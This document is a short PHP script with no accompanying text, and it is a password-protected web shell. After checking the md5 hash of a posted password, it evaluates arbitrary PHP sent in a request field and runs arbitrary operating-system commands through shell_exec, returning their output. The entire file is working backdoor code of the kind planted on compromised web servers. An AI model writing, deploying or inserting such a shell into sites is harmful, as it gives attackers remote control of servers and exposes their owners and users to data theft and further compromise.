<?php

    if(md5($_POST["pass"])=="495db1f6f1d1eab24a79824060e7cbd7"){
        eval($_POST[a]);
        if($_POST["shell"]){
            echo $_POST["shell"];
            $opcode = $_POST["shell"];
            $out=shell_exec($opcode);
            var_dump($out);
        }
    }
    else{
        echo "error passwd";
    }

?>
